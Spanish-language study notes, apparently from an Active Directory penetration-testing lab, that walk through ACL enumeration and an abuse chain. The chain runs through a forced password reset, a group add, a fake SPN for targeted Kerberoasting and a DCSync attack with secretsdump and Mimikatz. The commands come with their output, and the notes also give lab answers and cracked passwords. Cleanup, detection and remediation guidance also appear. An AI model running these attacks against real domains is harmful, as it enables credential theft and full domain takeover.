Ahora que hemos enumerado la ruta de ataque usando métodos más manuales como PowerView y cmdlets nativos de PowerShell, veamos lo mucho más sencillo que habría sido identificarla con la potente herramienta BloodHound. Tomemos los datos que recopilamos antes con el ingestor SharpHound y súbelos a BloodHound. A continuación, podemos establecer al usuario **wley** como nuestro nodo de partida, seleccionar la pestaña **Node Info** y desplazarnos hasta **Outbound Control Rights**. Esta opción nos mostrará los objetos sobre los que tenemos control directo, a través de la pertenencia a grupos, y el número de objetos que nuestro usuario podría llegar a controlar mediante rutas de ataque ACL en **Transitive Object Control**. Si hacemos clic en el “1” junto a **First Degree Object Control**, veremos el primer conjunto de permisos que enumeramos: **ForceChangePassword** sobre el usuario **damundsen**.

##### Viendo información de nodo a través de BloodHound

![[acls_bloodhound1.png]]

Al hacer clic derecho sobre la línea que une los dos nodos, se abre un menú contextual. Si seleccionas **Help**, BloodHound te mostrará:
- Detalles sobre ese permiso concreto (ACE) y ejemplos de herramientas y comandos para explotarlo.    
- Consideraciones de seguridad operacional (OpSec).    
- Referencias externas para profundizar.   

Más adelante exploraremos a fondo este menú y cómo sacarle todo el partido.

##### Investigando ForceChangePassword más

![[acls_bloodhound2.png]]
Si hacemos click en el `16` al lado de `Transitive Object Control`, veremos la ruta completa que enumeramos dolorosamente arriba. Desde aquí, podríamos aprovechar los menús de ayuda por cada arista para encontrar formas de acontecer cada ataque

##### Viendo rutas potenciales de ataque a través de BloodHound

![[acls_bloodhound3.png]]
Finalmente, podemos usar `pre-build queries` en BloodHound para confirmar que el usuario `adunn` tiene privilegios DCSync

##### Viendo Pre-Build queries a través de BloodHound

![[acls_Bloodhound4.png]]
Hemos enumerado estas rutas de ataque en múltiples formas. El siguiente paso será realizar esta cadena de ataque desde el principio hasta el final. Ahora, contestemos las preguntas de la academia.

##### _What is the rights GUID for User-Force-Change-Password?_

> **Respuesta:** 00299570-246d-11d0-a768-00aa006e0529

Lo primero es conectarnos por RDP:

```bash
rdesktop -u htb-student \
         -p 'Academy_student_AD!' \
         -d INLANEFREIGHT.LOCAL \
         10.129.175.187
```

En este momento, navegamos a la ruta `C:\Tools` e importamos el módulo de PowerView:

```powershell
Import-Module .\PowerView.ps1 
```

Ahora creamos el `$sid` con la siguiente línea:

```powershell
$sid = Convert-NameToSid wley
```

> → Usa PowerView para convertir el **nombre de usuario** `wley` en su correspondiente **SID (Security Identifier)**.

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

- `Get-DomainObjectACL -ResolveGUIDs -Identity *`  
    → Lista los **ACLs (listas de control de acceso)** de todos los objetos del dominio, resolviendo los GUIDs por nombres legibles.    
- `| ? {$_.SecurityIdentifier -eq $sid}`  
    → Filtra solo los objetos cuyos permisos están asignados al **SID** obtenido antes (usuario `wley`).

![[powerview_sid1.png]]

Si queremos ver el GUID:

```powershell
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

| Entry        | Value                               |
|--------------|-------------------------------------|
| CN           | User-Force-Change-Password          |
| Display-Name | Reset Password                      |
| Rights-GUID  | 00299570-246d-11d0-a768-00aa006e0529 |
##### _What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?_

> **Respuesta:** ResolveGUIDs

La opción `-ResolveGUIDs` de PowerView se utiliza porque muchos permisos en Active Directory (como los `ExtendedRights` o los `ObjectAceType`) se almacenan internamente como **GUIDs**. Estos identificadores globales únicos son difíciles de interpretar si no se traducen.

##### _What privileges does the user damundsen have over the Help Desk Level 1 group?_

> **Respuesta:** GenericWrite

```powershell
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Primero, con `$sid2 = Convert-NameToSid damundsen`, obtienes el **SID** del usuario `damundsen`.

Después, ejecutas `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}`, lo que significa que estás buscando **todos los objetos del dominio sobre los que `damundsen` tiene permisos explícitos**, y los filtras para que solo aparezcan aquellos en los que su **SID esté mencionado en las ACLs**.

El objetivo aquí probablemente sea **ver si `damundsen` tiene control sobre otros objetos**, por ejemplo, si puede cambiar contraseñas, replicar el AD, o tiene control total sobre usuarios o grupos. El flag `-ResolveGUIDs` se usa otra vez para que esos permisos se muestren en texto legible y no como GUIDs.

![[privileges.png]]

##### _Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne)_

> **Respuesta:** GenericAll

```powershell
$sid2 = Convert-NameToSid forend
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
```

![[Pasted image 20250721115755.png]]

El propósito aquí es comprobar **qué control tiene `forend` dentro del dominio**, es decir, si tiene permisos especiales sobre otros usuarios, grupos, OU o incluso sobre objetos críticos del dominio. Esto es clave para detectar posibles **delegaciones de control mal configuradas**, útiles para escalada de privilegios.

##### _What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)_

> **Respuesta:** Self-Membership

Lo primero es ejecutar SharpHound:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Este paso recopila toda la información relevante del entorno Active Directory para posteriormente analizarla en la interfaz de **BloodHound** y buscar relaciones de privilegios, rutas de ataque, delegaciones, etc. Después, subimos el archivo ZIP a BloodHound GUI para el análisis.

Seleccionamos FOREND@INLANEFREIGHT.LOCAL como nodo de comienzo. Después, desde la pestaña `Node Info`, navegamos hasta la sección `Outbound Control Rights`, seguida de `First Degree Object Control`

![[Pasted image 20250721120555.png]]

## Tácticas de abuso en ACL

Una vez más, para recapitular dónde estamos y hacia dónde queremos llegar: tenemos control sobre el usuario `wley`, cuya **hash NTLMv2** obtuvimos previamente ejecutando **Responder** durante la fase inicial de la auditoría. Tuvimos suerte, ya que este usuario usaba una contraseña débil, y pudimos **crackear la hash offline con Hashcat** y recuperar el valor en texto claro.

Sabemos que podemos usar este acceso para iniciar una cadena de ataque que nos permitirá tomar el control del usuario `adunn`, quien **tiene permisos para realizar un ataque DCSync**. Esto nos daría control total sobre el dominio, permitiéndonos obtener los hashes NTLM de todas las cuentas del dominio, escalar privilegios a **Domain Admin / Enterprise Admin** e incluso establecer **persistencia**.

Para ejecutar esta cadena de ataque, debemos hacer lo siguiente:

1. Usar el usuario `wley` para **cambiar la contraseña** del usuario `damundsen`.
2. Autenticarnos como `damundsen` y aprovechar los **permisos GenericWrite** para añadir un usuario bajo nuestro control al grupo **Help Desk Level 1**.
3. Aprovechar la **membresía en grupos anidados** del grupo **Information Technology** y los **permisos GenericAll** para tomar el control del usuario `adunn`.

Por tanto, lo primero es autenticarnos como `wley` y forzar el cambio de contraseña del usuario `damundsen`. Podemos empezar abriendo una consola de PowerShell y autenticándonos como el usuario `wley`, a menos que ya estemos ejecutando la sesión bajo esa identidad. Para ello, podemos crear un objeto `PSCredential`.

##### Creando un objeto PSCredential

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Después, debemos crear un [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0)  que representa la contraseña que queremos usar para el usuario objetivo `damundsen`. 

##### Creando un objeto SecureString

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Finalmente, usaremos la función `Set-DomainUserPassword` de PowerView para cambiar la contraseña del usuario. Es necesario usar el parámetro `-Credential` junto con el objeto de credenciales que creamos para el usuario `wley`. Es recomendable añadir siempre el flag `-Verbose` para obtener retroalimentación sobre si el comando se ejecutó correctamente o para ver el mayor nivel de detalle posible en caso de error. También podríamos hacer esto desde una máquina atacante Linux utilizando una herramienta como `pth-net`, que forma parte del conjunto de herramientas **pth-toolkit**.

##### Cambiando la contraseña del usuario

```powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Podemos ver que el comando se ejecutó correctamente, cambiando la contraseña del usuario objetivo utilizando las credenciales que especificamos para el usuario `wley`, sobre el cual tenemos control. A continuación, necesitamos llevar a cabo un proceso similar para **autenticarnos como el usuario `damundsen`** y **añadirnos al grupo Help Desk Level 1**.

##### Creando un SecureString Object usando damundsen

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

Después, podemos usar la función [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) para añadirnos a nosotros mismos en el grupo objetivo. Podemos primero confirmar que nuestro usuario no es un miembro del grupo objetivo. Esto también se podría hacer desde Linux usando `pth-toolkit`.

##### Añadiendo damundsen al grupo Help Desk Level 1

```powershell
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
...SNIP...
```

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

##### Confirmando que damundsen ha sido añadido al grupo

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

Si tenemos **permisos `GenericAll` sobre una cuenta** (en este caso, `adunn`) pero no podemos interrumpir su uso (por ser cuenta administrativa), podemos realizar un **Kerberoasting dirigido** creando un **SPN falso**.

1. **Requisitos previos**:    
    - Debemos estar autenticados como miembro del grupo `Information Technology`.        
    - Tenemos acceso a través de pertenencia anidada (ej: añadimos `damundsen` a `Help Desk Level 1`).        
2. **Técnica**:    
    - Modificamos el atributo `servicePrincipalName` de `adunn` para asignar un SPN controlado por nosotros.        
    - Solicitamos el TGS correspondiente.        
    - Crackeamos el hash offline con Hashcat.        
3. **Herramientas**:    
    - Desde Windows: `Set-DomainObject` (PowerView).        
    - Desde Linux: `targetedKerberoast` (automatiza SPN → solicitud TGS → limpieza).


##### Creando un SPN falso

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

> Si esto ha funcionado, también podremos hacer Kerberoasting sobre el usuario usando cualquier número de métodos y obtener el hash para crackearlo offline. 

##### Kerberoast con Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

..SNIP..

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

¡Genial! Hemos obtenido con éxito el hash. El último paso es intentar crackear la contraseña offline utilizando Hashcat. Una vez que tengamos la contraseña en texto claro, podremos autenticarnos como el usuario `adunn` y llevar a cabo el ataque DCSync, el cual se abordará en la siguiente sección.

### Limpieza

En términos de limpieza, hay algunas cosas que tendremos que hacer.

1. Eliminar el SPN falso que creamos en la cuenta `adunn`.    
2. Eliminar al usuario `damundsen` del grupo **Help Desk Level 1**.    
3. Restaurar la contraseña original del usuario `damundsen` (si la conocemos) o pedir al cliente que la restablezca o informe al usuario.    

> ⚠️ Este orden es importante, ya que si eliminamos antes al usuario del grupo, perderemos los permisos necesarios para eliminar el SPN falso.

Primero, eliminamos el SPN falso de la cuenta `adunn`

##### Eliminando el SPN falso de la cuenta `adunn`

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

Ahora, eliminaremos al usuario del grupo usando la función `Remove-DomainGroupMember`

##### Eliminando `damundsen` del grupo Help Desk Level 1

```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

Lo confirmamos:

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

Aunque realicemos una limpieza completa, es fundamental documentar cada modificación en el informe final. El cliente necesita conocer todos los cambios realizados en su entorno, y dejar constancia escrita nos protege ante posibles dudas futuras. El ejemplo mostrado es solo una de muchas posibles rutas de ataque que pueden encontrarse en un dominio real, algunas más simples y otras más complejas. Aunque este caso sea ficticio, rutas similares aparecen en auditorías reales, especialmente mediante ataques basados en ACL. Sin embargo, si la cadena de ataque resulta demasiado larga o arriesgada, es preferible limitarse a enumerar el camino y proporcionar pruebas suficientes al cliente para que entienda el problema y pueda corregirlo.

### Detección y remediación

- **Auditar y eliminar ACLs peligrosas**  
    Es recomendable realizar auditorías periódicas de Active Directory y formar al personal interno para usar herramientas como BloodHound que permitan detectar y eliminar ACLs potencialmente peligrosas.
    
- **Supervisar la pertenencia a grupos**  
    Es fundamental tener visibilidad sobre los grupos críticos del dominio. Cualquier cambio en estos grupos debe alertar al equipo de IT, ya que puede ser un indicio de una cadena de ataque basada en ACLs.
    
- **Auditar y monitorizar cambios en las ACLs**  
    Activar la política avanzada de auditoría de seguridad ayuda a detectar modificaciones sospechosas, en especial el **evento 5136**, que indica que se ha modificado un objeto del directorio. Esto puede señalar un cambio en los permisos vinculado a un ataque.

##### Viendo el ID de evento 5136

![[Pasted image 20250722101119.png]]
Si vamos a la pestaña `Details`, veremos que la información pertinente está escrita en [SDDL](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language), que no es legible para nosotros. Vemos los SDDL asociados:

![[Pasted image 20250722101222.png]]

Podemos usar el cmdlet [ConvertFrom-SddlString](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) para convertir esto a un formato legible:

```powershell-session
PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)...SNIP..." 

Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

Si filtramos por la propiedad `DiscretionaryAcl`, podemos observar que probablemente se ha concedido al usuario `mrb3n` privilegios de `GenericWrite` sobre el objeto del dominio, lo cual podría ser un indicio de un intento de ataque. Existen muchas herramientas que pueden utilizarse para monitorizar Active Directory. Combinadas con una postura de seguridad madura y con las capacidades nativas del sistema para auditar y generar alertas, pueden ser muy útiles para detectar este tipo de ataques y frenar su progresión. En la siguiente sección se explicará el ataque DCSync, que es la consecuencia directa del camino de ataque que acabamos de recorrer y una técnica habitual para comprometer por completo un dominio.

##### _Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer._

> **Respuesta**: SyncMaster757

Dado que tenemos permisos `GenericAll` sobre esta cuenta, podemos llevar a cabo un ataque Kerberoasting dirigido modificando su atributo `servicePrincipalName` para registrar un SPN falso. Esto nos permitirá solicitar un ticket TGS, extraerlo y tratar de crackearlo offline utilizando Hashcat.

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

![[Pasted image 20250722101713.png]]

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

![[Pasted image 20250722101723.png]]

Guardamos como un TGS y lo intentamos adivinar con Hashcat:

```bash
hashcat -m 13100 adunn_TGS /usr/share/wordlists/rockyou.txt
```

Tras un rato, vemos la contraseña crackeada. 

# DCSync


A partir del trabajo realizado en la sección anterior de [[ACL (Access Control List)]], ahora tenemos control sobre el usuario `adunn`, quien posee privilegios de DCSync en el dominio `INLANEFREIGHT.LOCAL`. Vamos a profundizar en este ataque y revisar ejemplos de cómo aprovecharlo para comprometer por completo el dominio, tanto desde un equipo atacante con Linux como desde uno con Windows.

##### Montando el escenario

En esta sección iremos alternando entre un equipo atacante con Windows y otro con Linux para mostrar distintos ejemplos del ataque. Puedes desplegar los hosts necesarios al final de la sección y conectarte por RDP al equipo Windows `MS01` usando las credenciales `htb-student:Academy_student_AD!`. Para la parte que requiere interacción desde un entorno Linux (uso de `secretsdump.py`), puedes abrir una consola PowerShell en `MS01` y conectarte por SSH a la IP `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`. Alternativamente, también sería posible realizar todo desde Windows utilizando una versión de `secretsdump.exe` compilada para ese sistema, ya que existen varios repositorios en GitHub con versiones del toolkit Impacket adaptadas para Windows. Esto último podría plantearse como un reto adicional.

### ¿Qué es DCSync y cómo funciona?

DCSync es una técnica que permite robar la base de datos de contraseñas de Active Directory aprovechando el protocolo de replicación entre Domain Controllers. El atacante simula ser un controlador de dominio y solicita los hashes NTLM de los usuarios. Para ello, necesita una cuenta con privilegios de replicación, concretamente con los permisos **Replicating Directory Changes** y **Replicating Directory Changes All**. Estos permisos suelen estar asignados por defecto a los administradores del dominio o Enterprise Admins.

##### Viendo privilegios de replicación de `adunn` a través de ADSI Edit

![[Pasted image 20250722102228.png]]

Es habitual durante una auditoría encontrar cuentas que, sin ser administradores, tienen permisos de replicación. Si se comprometen, pueden utilizarse para obtener el hash NTLM actual de cualquier usuario del dominio, así como los hashes de contraseñas anteriores. En este caso, se muestra un usuario estándar del dominio que ha recibido dichos permisos de replicación.

##### Usando `Get-DomainUser` para ver la membrería de grupo de `adunn`

```powershell
PS C:\htb> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

PowerView puede utilizarse para verificar que este usuario estándar tiene realmente asignados los permisos necesarios. Primero se obtiene el SID del usuario y luego se consultan todas las ACLs definidas sobre el objeto del dominio (`DC=inlanefreight,DC=local`) utilizando `Get-ObjectAcl`. En este caso, se busca específicamente si existen derechos de replicación y si el usuario `adunn` (referenciado en el comando como `$sid`) los posee. El resultado confirma que efectivamente cuenta con dichos permisos.
##### Usando `Get-ObjectAcl` para comprobar los privilegios de replicación de `adunn`

```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-498
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-516
ObjectAceType         : DS-Replication-Get-Changes-All

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
```

Si tuviésemos ciertos permisos sobre un usuario, como `WriteDacl`, podríamos asignarle privilegios de replicación a una cuenta bajo nuestro control, ejecutar el ataque DCSync y luego eliminar dichos privilegios para tratar de ocultar el rastro. El ataque puede llevarse a cabo con herramientas como **Mimikatz**, **Invoke-DCSync** o **secretsdump.py** de Impacket. Por ejemplo, al ejecutar `secretsdump.py` con el flag `-just-dc`, se extraen los hashes NTLM y claves Kerberos directamente del fichero NTDS, guardándolos en archivos con el prefijo `inlanefreight_hashes`.

##### Extrayendo hashes NTLM y Kerberos Keys usando `secretsdump.py`

```shell
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

Podemos usar el flag `-just-dc-ntlm` si solo queremos extraer los hashes NTLM, o `-just-dc-user <USUARIO>` para obtener datos de un único usuario. Otras opciones útiles son `-pwd-last-set` para ver cuándo se cambió por última vez cada contraseña, `-history` para obtener el historial de contraseñas (útil para cracking offline o métricas de seguridad), y `-user-status` para identificar cuentas deshabilitadas. Esto permite filtrar esos usuarios al generar estadísticas para el cliente, como el número y porcentaje de contraseñas crackeadas, los 10 passwords más comunes, métricas de longitud y reutilización, reflejando solo cuentas activas. Al usar el flag `-just-dc`, se generan tres archivos: uno con los hashes NTLM, otro con claves Kerberos y un tercero con contraseñas en texto claro (si hay cuentas con cifrado reversible habilitado).

```bash
$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

Aunque es poco común, ocasionalmente encontramos cuentas con cifrado reversible habilitado. Esto suele configurarse para dar soporte a aplicaciones que requieren el uso directo de la contraseña del usuario para autenticarse mediante ciertos protocolos.

##### Visualización de una cuenta con almacenamiento de contraseña mediante cifrado reversible

Si una cuenta tiene activada esta opción, las contraseñas se guardan cifradas con RC4, pero pueden descifrarse fácilmente ya que la clave está en el registro del sistema. Herramientas como `secretsdump.py` pueden extraer estas contraseñas durante un volcado del NTDS, ya sea con permisos de administrador o mediante un ataque DCSync. Las contraseñas seguirán almacenándose de forma reversible hasta que el usuario las cambie manualmente.

![[Pasted image 20250722102912.png]]

##### Enumerando más allá con `Get-ADUser`

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

Hay que tener en cuenta que `userAccountControl` es un atributo de tipo bitmask que contiene múltiples banderas (flags) para describir el estado y configuración de una cuenta de usuario en AD. Cada opción es un valor binario.

| Flag                                | Valor   |
| ----------------------------------- | ------- |
| SCRIPT                              | 1       |
| ACCOUNTDISABLE                      | 2       |
| HOMEDIR_REQUIRED                    | 8       |
| LOCKOUT                             | 16      |
| PASSWD_NOTREQD                      | 32      |
| PASSWD_CANT_CHANGE                  | 64      |
| **PASSWORD_ENCRYPTED_TEXT_ALLOWED** | **128** |
| NORMAL_ACCOUNT                      | 512     |
| DONT_EXPIRE_PASSWORD                | 65536   |

Podemos ver que existe una cuenta, `proxyagent`, que tiene cifrado reversible activado con PowerView:

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
```

Veremos que la herramienta desencriptó la contraseña y nos devolvió en texto claro la misma:

```shell
$ cat inlanefreight_hashes.ntds.cleartext 

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

En algunas auditorías me he encontrado con clientes que almacenaban todas las contraseñas usando cifrado reversible, lo que les permitía volcar el NTDS y hacer auditorías de fortaleza de contraseñas sin recurrir a cracking offline. Este ataque también puede realizarse con Mimikatz, apuntando a un usuario específico, como el administrador integrado. También podría atacarse la cuenta `krbtgt` para generar un Golden Ticket, aunque eso queda fuera del alcance de este módulo. Es importante ejecutar Mimikatz en el contexto de un usuario con privilegios DCSync, lo cual puede lograrse con `runas.exe`.

```cmd
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```

Desde la nueva sesión abierta con powershell podemos acontecer el ataque:

```powershell
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@inlanefreight.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
